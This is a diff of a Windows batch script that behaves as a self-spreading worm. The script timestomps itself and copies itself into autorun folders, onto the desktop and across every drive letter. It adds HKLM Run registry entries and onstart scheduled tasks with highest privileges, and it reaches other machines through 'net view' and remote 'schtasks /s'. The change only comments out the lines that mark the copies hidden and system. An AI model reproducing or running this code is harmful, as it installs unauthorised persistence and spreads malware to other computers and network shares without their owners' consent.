@@ -79,7 +79,7 @@ if not exist "%path_desktop%" (for /f "skip=2 tokens=2,* delims= " %%i in ('reg 
 
 
 %module_fileTouch% /w /a /c /d %app_date% "%~dpnx0"
-attrib +h +r +s "%~dpnx0"
+rem attrib +h +r +s "%~dpnx0"
 
 
 
@@ -99,12 +99,12 @@ reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v
 
 if exist "%path_autoRun1%\%~nx0" (
   %module_fileTouch% /w /a /c /d %app_date% "%path_autoRun1%\%~nx0"
-  attrib +h +r +s "%path_autoRun1%\%~nx0"
+  rem attrib +h +r +s "%path_autoRun1%\%~nx0"
 ) else copy /y "%~dpnx0" "%path_autoRun1%\"
 
 if exist "%path_autoRun2%\%~nx0" (
   %module_fileTouch% /w /a /c /d %app_date% "%path_autoRun2%\%~nx0"
-  attrib +h +r +s "%path_autoRun2%\%~nx0"
+  rem attrib +h +r +s "%path_autoRun2%\%~nx0"
 ) else copy /y "%~dpnx0" "%path_autoRun2%\"
 
 
@@ -123,7 +123,7 @@ if exist "%path_desktop%\%~nx0" (
     if exist "%path_desktop%\%~nx0" (
       attrib -h -r -s "%path_desktop%\%~nx0"
       %module_fileTouch% /w /a /c /d %app_date% "%path_desktop%\%~nx0"
-      attrib +h +r +s "%path_desktop%\%~nx0"
+      rem attrib +h +r +s "%path_desktop%\%~nx0"
     )
   )>nul 2>nul
 )
@@ -140,7 +140,7 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
         reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%~nx0" /f
         schtasks /create /sc onstart /tn "%app_name% %%i" /tr "%%i:\%~nx0" /f /rl highest
       )>nul 2>nul
-      attrib +h +r +s "%%i:\%~nx0"
+      rem attrib +h +r +s "%%i:\%~nx0"
 
       if /i "%%i:" NEQ "%systemDrive%" if /i "%%i:" NEQ "D:" (
         for /f "delims=" %%x in ('dir "%%i:\*" /a:d /b 2^>nul') do (
@@ -171,7 +171,7 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
         if exist "%%i:\%~nx0" (
           attrib -h -r -s "%%i:\%~nx0"
           %module_fileTouch% /w /a /c /d %app_date% "%%i:\%~nx0"
-          attrib +h +r +s "%%i:\%~nx0"
+          rem attrib +h +r +s "%%i:\%~nx0"
         )
       )>nul 2>nul
     )
@@ -186,7 +186,7 @@ for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The"
   for /f "skip=7 tokens=1,* delims= " %%j in ('net view %%i') do if /i "%%j" NEQ "The" (
     if exist "%%i\%%j\%~nx0" (
       (for /f "delims=\" %%z in ("%%i") do schtasks /create /s %%z /sc onstart /tn "%app_name% %%j" /tr "%%j:\%~nx0" /f /rl highest)>nul 2>nul
-      attrib +h +r +s "%%i\%%j\%~nx0"
+      rem attrib +h +r +s "%%i\%%j\%~nx0"
 
       if /i "%%j:" NEQ "C:" (
         for /f "delims=" %%x in ('dir "%%i\%%j\*" /a:d /b 2^>nul') do (
@@ -210,7 +210,7 @@ for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The"
         if exist "%%i\%%j\%~nx0" (
           attrib -h -r -s "%%i\%%j\%~nx0"
           %module_fileTouch% /w /a /c /d %app_date% "%%i\%%j\%~nx0"
-          attrib +h +r +s "%%i\%%j\%~nx0"
+          rem attrib +h +r +s "%%i\%%j\%~nx0"
         )
       )>nul 2>nul
     )
